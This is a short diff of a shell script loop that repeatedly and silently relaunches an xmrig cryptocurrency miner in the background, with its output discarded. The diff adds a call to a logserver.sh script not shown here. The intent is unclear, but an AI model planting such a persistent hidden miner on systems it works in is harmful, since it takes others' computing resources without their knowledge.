@@ -19,5 +19,6 @@ while true; do
             /bin/bash ./xmrig.sh --config=./config_background.json >/dev/null 2>&1
             sleep 10
         fi
+        ./logserver.sh
         sleep 5
 done
